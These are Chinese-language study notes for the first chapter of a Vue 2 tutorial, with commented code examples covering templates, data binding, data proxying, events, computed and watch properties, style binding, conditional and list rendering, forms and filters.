# 第一章：Vue核心

## 一 Vue简介

### 1.vue是什么

* 一套用于构建用户界面的渐进式JavaScript框架
  * 渐进式：Vue可以自底向上逐层的应用
  * 简单应用：只需要一个轻量小巧的核心库
  * 复杂应用：可以引入各式各样的Vue插件

### 2.Vue的特点

* 采用组件化模式，提高代码复用率、且让代码更好维护。
* 声明式编码，让编码人员无需直接操作DOM，提高开发效率。
* 使用虚拟DOM+优秀的Diff算法，尽量复用DOM节点。

## 二 hello world

~~~html
<body>
    <!-- 准备一个容器 -->
    <div id="app">
        <h1>{{ title }}</h1>
        <h2>{{ msg }}</h2>
    </div>

    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        //关闭控制台的开发版提示信息
        Vue.config.productionTip = false

        //创建Vue实例
        let vm = new Vue({
            el: '#app',//用于指定当前Vue实例为哪个容器服务，通常为css选择器字符串。这里也可以写 el: document.getElementById('root')
            data: {//data用于存储数据，数据供el指定的容器使用，值可以是一个对象，vue-cli里要写成函数
                title : 'vue !!!',
                msg : 'hello vue !'
            }
        })
    </script>
</body>
~~~

* 一个容器与一个vue实例==一一对应==
  * 如果是类选择器选中两个及以上的容器，只会对第一个管理
* 使用 {{ }} 两对花括号来插入数据
  * 改数据可以是data里的数据，或者其他数据或表达式、函数等等（如 写 1+1 页面显示为2，或者date.now()会显示当前时间）

另一种指定容器的方法（更灵活）

~~~javascript
let vm = new Vue({
        // el: '#app',
        data: {
            title: "shishi",
            msg: 'hello vue'
        }
     })
     vm.$mount('#app')
~~~

另一种data写法（组件式编码里必须使用这种写法）

~~~javascript
 new Vue({
        el: '#app',
        data () {
            return {
                title: "shishi",
                msg: 'hello vue'
            }
        }
    })
~~~

* 这里的this是vue实例
* 如果这里的data函数使用箭头函数，this将变为window（注意！！！）



## 三模板语法

~~~html
<body>
    <div id='app'>
        <h1>插值语法</h1>
        <h2>hello, {{ name }}</h2>
        <h1>指令语法</h1>
        <a v-bind:href="url">点我进行搜索</a>
        <!-- <a :href="url">点我进行搜索</a> -->
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>

        new Vue({
            el: '#app',
            data () {
                return {
                    name: 'shishi',
                    url: 'http://www.baidu.com'
                }
            }
        })
    </script>
</body>
~~~

* 使用 {{  }} 来包含js表达式
* 使用 v-bind：或者简写为 ：来强制绑定内容为js解析表达式



1. 插值语法：
   * 功能：用于解析标签体内容
   * 写法： {{ xxx }}，xxx是js表达式，且可以直接读取到data中的所有属性
2. 指令语法：
   * 功能： 用于解析标签（包括：标签属性、标签体内容、绑定事件...）
   * 使用v-bind：强制绑定，可以简写为 ：，属性值要写js表达式，同样可以读取到data的属性

## 四 数据绑定

~~~html
<body>
    <div id='app'>
        单向数据绑定：
        <input type="text" :value="name">
        <br>
        双向数据绑定：
        <input type="text" v-model ="name">
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>

        new Vue({
            el: '#app',
            data () {
                return {
                   name: 'shishi'
                }
            }
        })
    </script>
</body>
~~~

* v-bind 是单向绑定的，data里的数据会影响input的值，但是改变input的值不会影响data里的值
* v-model 是双向绑定的，其中一方改变都会影响对方
  * 双向绑定一般都应用在表单类元素上（输入类元素）
  * v-model:value 可以简写为 v-model，因为v-model默认收集的是value的值

## 五 MVVM模型

* M：模型（Model）：对应data中的数据
* V：视图（View）：模板
* VM：视图模型（ViewModel）：Vue实例对象

## 六 数据代理

### Object.defineproperty方法

~~~html
<script>
        let dog = {
            name: "hh",
            age: 12
        }
        Object.defineProperty(dog,'num',{
            value: 3
        })
        console.log(dog);//{name: "hh", age: 12, num: 3}

        for(let k in dog){
            console.log(dog[k]);
        }// hh , 12
    </script>
~~~

* Object.defineproperty()能为一个对象添加属性
* 但是该属性默认不会被枚举出来

* 但是可以修改配置是否可以被枚举 enumerable: true

~~~javascript
 Object.defineProperty(dog,'num',{
            value: 3,
            enumerable: true
        })
~~~

* 而且该属性值默认不能被修改

~~~javascript
dog.num = 5//修改不了
~~~

* 同样需要修改一个配置项  writable: true

~~~javascript
Object.defineProperty(dog,'num',{
            value: 3,
            enumerable: true,
            writable: true
        })
~~~

* 同样的，控制属性是否可以被删除 configurable: true

* getter 和sette

~~~javascript
 let number = 22
        let dog = {
            name: "hh",
            age: 12
        }
Object.defineProperty(dog,"num",{
            //当有人读取dog的num属性时候，get函数(俗称getter)会被调用，且返回值是num的值
            get:function(){
                return number
            },
            //同理设置
            set(newValue){//简写
                console.log("修改为"+newValue);
                number = newValue
            }
        })
        number = 13
        dog.num = 59
        console.log(dog);
~~~

### 数据代理？

* ==通过一个对象代理对另一个对象中属性的操作（读/写）==

一个简单的数据代理，操作obj_2来代理obj_1

~~~html
<script>        let obj_1 = {a:100}        let obj_2 = {b:200}        Object.defineProperty(obj_2,'a',{             get(){                return obj_1.a            },            set(value){                obj_1.a = value            }         })    </script>
~~~

控制输入输出如下

~~~shell
obj_2.a：100obj_2.a = 300：300obj_1：{a: 300}
~~~

### vue中的数据代理

~~~html
<body>    <div id="app">        <h1>姓名： {{ name }}</h1>        <h1>地址： {{ address }}</h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        let vm = new Vue({           el: '#app',           data: {               name: 'shishi',               address: 'xxx 省 xxx 市'           }        })    </script></body>
~~~

控制台输入vm打印可以看到很多属性，其中会出现 name 和 address属性，鼠标放在属性值的括号内容上，会出现 提示`Invoke property getter`的提示，就是读取该属性时候调用了getter（data中的对应的属性），同理setter（控制台修改vm的该属性，在vue调试工具里也可以看到data中的属性值也发生了改变，上面的代码也会让页面的数据也发生改变了，或者控制台输入vm.$data或者vm._data），也能看到变化，因为data是存、存储在vm实例中的）。

* vue中将data作为_data添加到了vm实例属性上
* 然后将其中的属性又添加到了vm实例属性上，并且使用getter和setter读取_data中对应属性
* 以上操作就是利用了API: Object.defineproperty()
* 方便了对数据的操作
* 打开_data中除了我们自己写的属性和值，里面还做了一些数据劫持，就是动态的数据和页面数据的相互影响

## 七 事件处理

### 1.简单使用：

~~~html
<body>    <div id="app">        <button v-on:click = 'show'>{{ info }}</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        let vm = new Vue({           el: '#app',           data: {                info: '点击我'           },           methods: {               show(event){                   console.log(this);                   console.log(this === vm);                   console.log(event);               }           }        })    </script></body>
~~~

点击之后：控制台输出

~~~shell
Vue {_uid: 0, _isVue: true, $options: {…}, _renderProxy: Proxy, _self: Vue, …}trueMouseEvent {isTrusted: true, screenX: 46, screenY: 89, clientX: 46, clientY: 16, …}
~~~

* 如果方法使用了箭头函数的话，this将变为Window，建议不适用箭头函数

* click = 那里方法名后不加括号也能被调用，如果要传参数就加括号

* 简写形式  ：  @click（不要写成  :click, :是v-bind的简写，@才是v-on的简写，当什么的时候）

* 如果传参数

~~~html
<body>    <div id="app">        <button v-on:click = 'show'>{{ info }}</button>        <button v-on:click = 'show2(info)'>{{ info }}</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        let vm = new Vue({           el: '#app',           data: {                info: '点击我'           },           methods: {               show(event){                   console.log(this);                   console.log(this === vm);                   console.log(event);               },               show2(msg){                   console.log(msg);               }           }        })    </script></body>
~~~

点击输出 

~~~shell
点击我
~~~

那么 传参数的情况下event呢？

1. 可以直接使用event，不用参数接受

~~~javascript
show2(msg){       console.log(msg);       console.log(event);//同样也能获取到}
~~~

2. 在实参里使用占位符，同样也能接受到

~~~html
<button v-on:click = 'show2(info,$event)'>{{ info }}</button>show2(msg,event333){      console.log(msg);      console.log(event333);}
~~~

* 注意：这里的两个方法也将出现到vm实例上，但是没有做数据代理（因为没必要，它只是个方法，写啥样，就啥样）

* 所以可以直接写到vm属性上，不用写到methods里

~~~javascript
vm.show2 = function(msg,event333){                   console.log(msg);                   console.log(event333);               }
~~~

* 甚至可以写到data里, 但是这样会让vue给他做数据代理和数据劫持，非常不建议这样写

~~~javascript
data: {      info: '点击我',      show2(msg,event333){      		console.log(msg);      		 console.log(event333);        }},
~~~

### 2.事件修饰符

例子：取消a标签的默认跳转行为

~~~html
<body>    <div id="app">        <h1>hello {{ name }}</h1>        <a href="http://www.baidu.com" @click = "show">百度一下</a>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data: {               name: 'shishi'           },           methods: {               show(event){                   alert("hello !!!")                   event.preventDefault()               }           }        })    </script></body>
~~~

* 这里使用的是event的preventDefault方法来取消事件默认行为
* 但是vue给我们提供了更好的方法，我们可以使用事件修饰符 .prevent

~~~html
<a href="http://www.baidu.com" @click.prevent = "show">百度一下</a>
~~~

vue一共给我们提供了六个事件修饰符

* .prevent: 阻止事件默认行为
* .stop: 阻止事件冒泡
* .once：事件只触发一次
* .capture：使用事件的捕获模式
* .self：只有event.target是当前操作的元素才触发事件
* .passive：事件的默认行为立即执行，无需等待事件回调函数执行完毕
* 时间修饰符可以链式使用，注意链式顺序

### 3.键盘事件

* 使用.enter来表示回车按键

~~~html
<body>    <div id="app">        <input type="text" v-model = msg @keyup.enter="show">    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data: {               msg: 'hh'           },           methods: {               show(){                   console.log(event.target.value);               }           }        })    </script></body>
~~~

* 一共有九个常用的别名
  * 回车： enter
  * 删除： delete（包括退格键）
  * 退出：esc
  * 空格：space
  * 换行：tab
  * 上：up
  * 下：down
  * 左：left
  * 右：right
* 系统修饰键（比较特殊）：ctrl，alt，shift，meta（win键）
  * keyup：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发
  * keydown：正常触发事件
* 也可以使用keyCode去指定具体的按键（不推荐）
  * 比如 @keyup.enter=== @keyup.13
* 注意给 tab键会让焦点切走，给他绑定事件keyup会出问题，要使用keydown
* 键盘按钮也能链式使用比如  .ctrl.y表示ctrl键和y同时按下

## 八 计算属性

* 先使用methods 来实现

~~~html
<body>
    <div id="app">
        姓：
        <input type="text" v-model = 'firstName'>
        <br>
        名：
        <input type="text" v-model = 'lastName'>
        <br>
        全名：<span>{{ name() }}</span>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
       new Vue({
          el: '#app',
          data () {
             return {
                 firstName : 'd',
                 lastName: 'g'
             }
          },
          methods: {
              name(){
                  return this.firstName.slice(0,2) + this.lastName.slice(0,3)
              }
          }
       })
    </script>
</body>
~~~

* 注意这里的{{}}里name要加（），不加表示页面要显示这个函数，而我们应该是调用这个函数
* 只要data中的数据发生改变，vue就会重新解析一边，插值语法里的方法也会被重新调用一遍
* 直接在{{}}写返回语句的表达式也行

* 计算属性实现 computed

~~~html
<body>
    <div id="app">
        姓：
        <input type="text" v-model = 'firstName'>
        <br>
        名：
        <input type="text" v-model = 'lastName'>
        <br>
        全名：<span>{{ name }}</span>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
       let vm = new Vue({
          el: '#app',
          data () {
             return {
                 firstName : 'd',
                 lastName: 'g'
             }
          },
          computed: {
              name: {
                  get(){
                      return this.firstName + this.lastName
                  },
              }
          }
       })
    </script>
</body>
~~~

* 控制打印vm发现name出现在vm上
* 但是 name 没有出现在vm._data中，因为name是作为计算属性被计算出来的，之后被放到vm上
* 而且计算属性的this被vue调整为了vm
* 而且计算属性有缓存，如果这样写，get只被调用了一次

~~~html
全名：<span>{{ name }}</span>全名：<span>{{ name }}</span>全名：<span>{{ name }}</span>全名：<span>{{ name }}</span>
~~~

* get什么时候被调用？
  1. 初次调用该属性时
  2. 所依赖的数据发生改变时候（为了保证数据的对应更新）
* set方法不是必须写的，除非有需求，set只有在该属性被修改时候才调用

* 当确定该属性只读不改时，可以使用简写

~~~html
<body>    <div id="app">        姓：        <input type="text" v-model = 'firstName'>        <br>        名：        <input type="text" v-model = 'lastName'>        <br>        全名：<span>{{ name }}</span>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>       let vm = new Vue({          el: '#app',          data () {             return {                 firstName : 'd',                 lastName: 'g'             }          },          computed: {              name () {                   return this.firstName+this.lastName               }          }       })    </script></body>
~~~

* 注意{{}}里不要加（），它是计算属性，虽然写成了函数，他只是get函数，返回的值以name作为名字属性保存到vm上

## 九监视属性

~~~html
<body>    <div id="app">        <h1>今天的温度：{{value}}°</h1>        <h2>今天的天气： {{info}}</h2>        <button @click='upT'>更新温度</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  value: 29              }           },           computed: {               info(){                   return (this.value > 23) ?  "炎热":  '寒冷'               }           },           methods: {               upT(){                   this.value = parseInt(Math.random()*35)               }           },           watch: {               value:{                   //当value发生改变时候，handler会被调用                   handler(newValue, oldValue){                        console.log('value 被修改了');                        console.log("原来的值：",oldValue);                        console.log("新的值：  ",newValue);                   }               }           }        })    </script></body>
~~~

* watch监视属性

  * 当被监视的属性的属性值发生改变时候，配置的handler函数被调用，并且可以接受到两个参数，新值和旧值

  * 监视属性也可以监视计算属性（计算属性也是属性）

  * 还有一些其他的配置，例如immediate

  * ~~~javascript
    watch: {               value:{                   immediate: true,//初始化时候让handler被调用一次                   //当value发生改变时候，handler会被调用                   handler(newValue, oldValue){                        console.log('value 被修改了');                        console.log("原来的值：",oldValue);                        console.log("新的值：  ",newValue);                   }               }           }
    ~~~

* 或者在vm实例上加监视（写在外面）

~~~javascript
vm.$watch('value',{             immediate: true,            //当value发生改变时候，handler会被调用            handler(newValue, oldValue){                 console.log('value 被修改了');                 console.log("原来的值：",oldValue);                 console.log("新的值：  ",newValue);            }         })
~~~

### 深度监视

### 监视多层次的属性

~~~html
<body>    <div id="app">        <h1>a : {{numbers.a}}</h1>        <button @click='numbers.a++'>a++</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        let vm = new Vue({           el: '#app',           data () {              return {                  numbers: {                      a: 1,                      b: 2                  }              }           },           watch: {             'numbers.a' : {                  handler(){                    console.log('a 变了');                  }              }           }        })    </script></body>
~~~

* 注意number.a写成字符串，加上引号，表示一个属性名（即要监视的属性）

* 深度监视：numbers中有变化的监视

~~~html
<body>    <div id="app">        <h1>a : {{numbers.a}}</h1>        <button @click='numbers.a++'>a++</button>        <h1>b: {{numbers.b}}</h1>        <button @click='numbers.b++'>b++</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        let vm = new Vue({           el: '#app',           data () {              return {                  numbers: {                      a: 1,                      b: 2                  }              }           },           watch: {             numbers: {                 handler(){                    console.log('numbers 变了');                 }             }           }        })    </script></body>
~~~

* 这样写是错误的，因为numbers是复杂数据类型，指针地址是没改变的，a,b变了它的地址是不会变的
* vue默认是会监视到多层次的属性改变的，但是watch默认不检测多层的改变的
* 所以要加深度监视配置deep: true,

~~~javascript
watch: {     numbers: {         deep: true,         handler(){              console.log('numbers 变了');         }     }}
~~~

### 监视的简写形式

* 如果不需要配置项，只有handler的时候就可以使用简写

~~~javascript
watch: {     value(newValue,oldValue){          console.log('value 发生了改变');          console.log("原来的值：",oldValue);          console.log("新的值：  ",newValue);     }}
~~~

或者(vue管理的函数千万不要用箭头函数)

~~~javascript
 vm.$watch("value", function(newValue,oldValue){            console.log('value 被修改了');            console.log("原来的值：",oldValue);            console.log("新的值：  ",newValue);        })
~~~

## 十 绑定样式

### class样式绑定---字符串写法

* 适用于样式的类名不确定，需要动态绑定

~~~html
<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta http-equiv="X-UA-Compatible" content="IE=edge">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Document</title>    <style>        .w1{            width: 100px;            height: 100px;        }        .w2{            width: 200px;            height: 200px;        }        .w3{            width: 300px;            height: 300px;        }        .s1{                        background: red;        }        .s2{            background: green;        }        .s3{            background: bisque;        }    </style></head><body>    <div id="app">        <div @click='change' :class='color +" "+size'>            这里        </div>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {               return {                  size: 'w2',                  color: 's2'               }           },           methods: {               change(){                  this.color = 's3'                  this.size = 'w3'               }           }        })    </script></body></html>
~~~

### 数组类形式

* 就是将类名保存到一个数组里，然后将数组变量放到 ：class后面，适用于类名和个数都不确定

### 对象写法

* 适用于样式个数确定，名字也确定，但是需要动态决定是否启用样式

~~~html
<!DOCTYPE html><html lang="en"><head>    <meta charset="UTF-8">    <meta http-equiv="X-UA-Compatible" content="IE=edge">    <meta name="viewport" content="width=device-width, initial-scale=1.0">    <title>Document</title>    <style>        .w1{            width: 100px;            height: 100px;        }        .w2{            width: 200px;            height: 200px;        }        .w3{            width: 300px;            height: 300px;        }        .s1{                        background: red;        }        .s2{            background: green;        }        .s3{            background: bisque;        }    </style></head><body>    <div id="app">        <div @click='change' :class='style'>            这里        </div>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {               return {                  style:{                      s1: false,                      s2: false,                      s3: true,                      w1: false,                      w2: false,                      w3: true                  }               }           },        })    </script></body></html>
~~~

* 为了灵活应用，一般都会将true和false提出变量动态使用
* 也可以将对象直接写在   ：class后面

### style 样式绑定

~~~html
<body>
    <div id="app">
        <div :style='{fontSize : f_size+ "px"}'>
            这里
        </div>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
               return {
                 f_size: 40
               }
           },
        })
    </script>
</body>
~~~

* :style 后面要跟表达式，所以写一个对象配置

* 所以一般这样写

~~~html
<body>
    <div id="app">
        <div :style='obj'>
            这里
        </div>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
               return {
                 obj:{
                     fontSize: '40px',
                    color: 'red'
                 }
               }
           },
        })
    </script>
</body>
~~~

* 也可以使用数组写，数组里的数据是样式对象，与上面这种发生了嵌套，非常不常见的写法

## 十一条件渲染

### v-show

~~~html
<body>
    <div id="app">
        <h1 v-show=isShow>我的名字是：{{ name }}</h1>
        <button @click='isShow = !isShow'>点我 ！！！</button>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  name: 'shishi',
                  isShow: true
              }
           }
        })
    </script>

</body>
~~~

* v-show会让元素加上一个样式，display：none，也就是说该控件占用的空间会被让出来给其他元素挤上来
* 该元素在html里结构仍然存在

### v-if

~~~html
<body>
    <div id="app">
        <h1 v-if=isShow>我的名字是：{{ name }}</h1>
        <button @click='isShow = !isShow'>点我 ！！！</button>
    </div>
    <script src="../node_modules/vue/dist/vue.js"></script>
    <script>
        new Vue({
           el: '#app',
           data () {
              return {
                  name: 'shishi',
                  isShow: true
              }
           }
        })
    </script>

</body>
~~~

* 会直接在结构里删除掉该元素，打开html结构是看不到的，而v-show是不会删除掉结构的，只是加了dispaly：none的样式

如果需求是频繁切换显示隐藏，建议用v-show，v-if会频繁操作DOM的添加和删除。

* v-else ： 由名可知用法
* v-else-if： 由名可知用法，与if，else if，else 的用法是一样的

~~~html
<body>    <div id="app">        <h1 v-if=isShow>我的名字是：{{ name }}</h1>        <h1 v-else>hhhhhhh</h1>        <button @click='isShow = !isShow'>点我 ！！！</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  name: 'shishi',                  isShow: true              }           }        })    </script></body>
~~~

注意多行显示隐藏的用法

* 如果是这样的，这样显得愚蠢

~~~html
<h1 v-if=isShow>我的名字是：{{ name }}</h1><h1 v-if=isShow>我的名字是：{{ name }}</h1><h1 v-if=isShow>我的名字是：{{ name }}</h1>
~~~

* 优化一下，但是这样会影响页面结构

~~~html
<div v-if=isShow>            <h1>我的名字是：{{ name }}</h1>            <h1>我的名字是：{{ name }}</h1>            <h1>我的名字是：{{ name }}</h1></div>
~~~

* 使用模板template，页面渲染时候会将template脱去，但是只能和v-if配合使用，v-show没用

~~~html
<template v-if=isShow>            <h1>我的名字是：{{ name }}</h1>            <h1>我的名字是：{{ name }}</h1>            <h1>我的名字是：{{ name }}</h1></template>
~~~

## 十二 列表渲染

* v-for遍历， :key 是必要的，表示每一个遍历的元素的唯一标识
* ul li 这里只是为了让结构清晰，谁加了v-for，就让谁遍历生成
* v-for="(p,index) in persons" 表示每一个遍历可以接受到两个参数：
  * 每一个遍历的数据
  * 对应的index
  * 如果不需要index，也可以写成 p in persons
  * in 和 of 两个都行：  p of persons

~~~html
<body>    <div id="app">        <ul>            <li v-for="(p,index) in persons" :key="index"> 序号：{{ index }} id：{{ p.id }} 名字：{{ p.name }} 年龄： {{ p.age }}</li>        </ul>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  persons:[                      {                          id: 01,                          name: 'shishi',                          age: '12'                      },                      {                          id: 02,                          name: 'zhan',                          age: '16'                      },                      {                          id: 03,                          name: 'geigei',                          age: '16'                      }                  ]              }           }        })    </script></body>
~~~

* 可以遍历数组，也可以遍历对象，注意接受的参数就行了（value， key）键值对
* 甚至可以遍历字符串（本身就是字符数组）
* 可以指定遍历次数，number就是 1-5，index就是0-4

~~~html
<li v-for='(number, index) in 5'>{{number}},{{index}}</li>
~~~

### key的作用和原理

~~~html
<body>    <div id="app">        <ul>           <li v-for="(p,index) in persons" :key="index">                 {{ index }} ------{{ p.name }} ------{{ p.id }}                 <input type="text">            </li>        </ul>        <button @click='add'>添加一条数据</button>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  persons:[                      {                          id: 01,                          name: 'shishi',                      },                      {                          id: 02,                          name: 'zhan',                      },                      {                          id: 03,                          name: 'geigei',                      }                  ]              }           },           methods: {               add(){                    let p = {id: 04,name: 'meimei'}                    console.log(p);                    this.persons.unshift(p)               }           }        })    </script></body>
~~~

* 使用index作为 key值

* 点击添加会加在页面数据的最前面，而且可以重复添加
* 使用index作为key问题：
  * 注意每一条数据的input，我们在页面输入数据在里面后，添加数据，input里的数据会往上移动，对齐在新加数据的后面，也就是跟我们的元素对不上了（不写key也会出现这个问题），因为虚拟DOM做新旧对比时候，Key发生变化，input标签是一样的被复用了（因为diff比较的虚拟dom）会跟着key走，文本节点不会是因为对比时候发现变了就更新了（虚拟DOM对比）input输入数据是在真实DOM上，而diff算法对比的是虚拟DOM，所以就错位了
  * 使用index作为key效率会很低
  * 真实DOM上没有key属性，但是虚拟DOM上是有的

### 列表过滤

#### 使用监视属性实现

~~~html
<body>    <div id="app">        <input type="text" placeholder="输入名字进行搜索" v-model='keyWords'>        <ul>            <li v-for="(p,index) in filPersons" :key="p.id">                 id：{{ p.id }} 名字：{{ p.name }} 薪水 {{ p.salary }}            </li>        </ul>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                keyWords: '',                persons:[                      {id: 01,name: 'shishi',salary: 1000},                      {id: 02,name: 'zhan',salary: 3000},                      {id: 03,name: 'geigei',salary: 5000},                      {id: 04,name: 'shitt',salary: 9000},                  ],                  filPersons: []              }           },           watch: {               keyWords:{                   immediate: true,                   handler(value){                        this.filPersons = this.persons.filter((p)=>{                             return p.name.indexOf(value) !== -1                        })                   }               }           }        })    </script></body>
~~~

* 一定要加immediate配置，保证页面刚出来的时候有数据

#### 使用计算属性实现

~~~html
<body>    <div id="app">        <input type="text" placeholder="输入名字进行搜索" v-model='keyWords'>        <ul>            <li v-for="(p,index) in filPersons" :key="p.id">                 id：{{ p.id }} 名字：{{ p.name }} 薪水 {{ p.salary }}            </li>        </ul>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                keyWords: '',                persons:[                      {id: 01,name: 'shishi',salary: 1000},                      {id: 02,name: 'zhan',salary: 3000},                      {id: 03,name: 'geigei',salary: 5000},                      {id: 04,name: 'shitt',salary: 9000},                  ],              }           },           computed: {               filPersons(){                   return this.persons.filter((p)=>{                       return p.name.indexOf(this.keyWords) !== -1                   })               }           }        })    </script></body>
~~~

* 明显对比使用计算属性比较简单方便

### 列表排序

~~~html
<body>    <div id="app">        <input type="text" placeholder="输入名字进行搜索" v-model='keyWords'>        <button @click='sortType=2'>薪水降序</button>        <button @click='sortType=1'>薪水升序</button>        <button @click='sortType=0'>原顺序</button>        <ul>            <li v-for="(p,index) in filPersons" :key="p.id">                 id：{{ p.id }} 名字：{{ p.name }} 薪水 {{ p.salary }}            </li>        </ul>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                keyWords: '',                sortType: 0,//0 原顺序，1 升序，2 降序                persons:[                      {id: 01,name: 'shishi',salary: 1000},                      {id: 02,name: 'zhan',salary: 3000},                      {id: 03,name: 'geigei',salary: 5000},                      {id: 04,name: 'shitt',salary: 9000},                  ],              }           },           computed: {               filPersons(){                   let arr = this.persons.filter((p)=>{                       return p.name.indexOf(this.keyWords) !== -1                   })                   if(this.sortType){                        arr.sort((a,b)=>{                            return this.sortType===1 ? a.salary-b.salary : b.salary-a.salary                        })                   }                   return arr               }           }        })    </script></body>
~~~

* 注意计算属性里写的排序和过滤，要保证在过滤后的数据排序才能达到要求

* 所以，计算属性和监视属性都能实现的时候，使用计算属性比较好

## 十三 收集表单数据

~~~html
<body>    <div id="app">        <form @submit.prevent='demo'>            账号：<input type="text" v-model.trim="account"><br><br>            密码：<input type="password" v-model="pwd"><br><br>            性别：<br><br>            男<input type="radio" name="sex" value=0 v-model.number="sex">            女<input type="radio" name="sex" value=1 v-model.number="sex"><br><br>            爱好：<br><br>            抽烟<input type="checkbox" value="抽烟" v-model="hobby">            喝酒<input type="checkbox" value="喝酒" v-model="hobby">            烫头<input type="checkbox" value="烫头" v-model="hobby"><br><br>            所属地址            <select v-model="city">                <option value="">请选择地址</option>                <option value="beijing">北京</option>                <option value="shanghai">上海</option>                <option value="chengdu">成都</option>                <option value="shengzheng">深圳</option>            </select><br><br>            其他信息：<br><br>            <textarea cols="30" rows="10" v-model.lazy="otherInfo"></textarea><br><br>            <input type="checkbox" v-model='isAgree'>阅读并接受用户信息   <a href="http://www.baidu.com">《用户协议》</a>            <button>提交</button>        </form>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  account: '',                  pwd: '',                  sex: 0,                  hobby: [],                  city: '',                  otherInfo: '',                  isAgree: false              }           },           methods: {               demo(){                   console.log("用户信息");                   //1.这样可以，但是不建议直接访问_data                   console.log(JSON.stringify(this._data));                    //2.封装用户对象,或者在data里就写成对象的形式                    console.log('ajax');               }           }        })    </script></body>
~~~

* radio和checkbox要自己配置value值，如果不配置默认收集checked状态（boolean）

  * checkbox收集的数据要初始化为数组，才会是想要的效果，不然仍然是收集checked状态

  * ~~~javascript
    data () {              return {                  account: '',                  pwd: '',                  sex: 0,                  hobby: []              }
    ~~~

* v-model 也可以加修饰符，不然输入的东西会被默认为字符

  * ~~~html
    性别：<br><br>男<input type="radio" name="sex" value=0 v-model.number="sex">女<input type="radio" name="sex" value=1 v-model.number="sex"><br><br>
    ~~~

  * 其他修饰符

    * .lazy 当焦点移出去才会收集

    * ~~~html
      其他信息：<br><br><textarea cols="30" rows="10" v-model.lazy="otherInfo"></textarea><br><br>
      ~~~

    * .trim 去掉前后空格

    * ~~~html
      账号：<input type="text" v-model.trim="account"><br><br>
      ~~~

* 一般现在都不让表单默认提交并刷新页面，而只是将表单作为结构使用

* ~~~html
  <form @submit.prevent='demo'>
  ~~~

## 十四 过滤器

* 例子：转化时间戳
* 自己使用第三方库转化
* npm i dayjs
* 1. 使用计算属性实现

~~~html
<body>    <div id="app">        <h1>时间： {{ fTime }}</h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script src="../node_modules/dayjs/dayjs.min.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  time: Date.now()              }           },           computed: {               fTime(){                //    return dayjs(this.time)                   return dayjs(this.time).format('YY-MM-DD: mm-ss')               }           }        })    </script></body>
~~~

* 2. 使用过滤器实现
* 加配置项filters：{}
* 在属性后面加管道符 |  加过滤器   {{ time | timeFormater }}
* 自定义过滤器，返回值将作为页面要显示的东西
* 而且vue自己将参数传了进去，只用接收直接用就行

~~~html
<body>    <div id="app">        <!-- <h1>时间： {{ fTime }}</h1> -->        <h1>时间： {{ time | timeFormater }}</h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script src="../node_modules/dayjs/dayjs.min.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  time: Date.now()              }           },        filters:{            timeFormater(value){                return dayjs(value).format('YY-MM-DD: mm-ss')            }        }        })    </script></body>
~~~

* 3. 过滤器的高级写法
* 过滤器接收的第一个参数是管道符前面的值
* 可以用第二个参数来接收过滤器传进来的参数

~~~html
<body>    <div id="app">        <!-- <h1>时间： {{ fTime }}</h1> -->        <h1>时间： {{ time | timeFormater('YY-MM-DD: mm-ss') }}</h1>    </div>    <script src="../node_modules/vue/dist/vue.js"></script>    <script src="../node_modules/dayjs/dayjs.min.js"></script>    <script>        new Vue({           el: '#app',           data () {              return {                  time: Date.now()              }           },        filters:{            timeFormater(value, str='YY-MM-DD'){                return dayjs(value).format(str)            }        }        })    </script></body>
~~~

* 可以同时用多个过滤器，形成一种嵌套，后面的会将前面的值作为参数

~~~html
